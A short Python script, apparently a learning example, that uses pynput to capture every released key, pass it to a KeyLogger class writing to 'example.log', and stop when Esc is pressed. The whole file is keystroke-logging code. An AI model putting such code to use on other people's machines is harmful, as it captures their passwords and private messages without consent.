# -*- coding: utf-8 -*-
from pynput.keyboard import Key
from pynput.keyboard import Listener
from modules import KeyLogger

key_logger = KeyLogger(name_file='example.log')


def on_release(key):
    key_logger.send(key)
    if key == Key.esc:
        return False

if __name__ == '__main__':
    try:
        with Listener(on_release=on_release) as listener:
            listener.join()
    finally:
        key_logger.close()
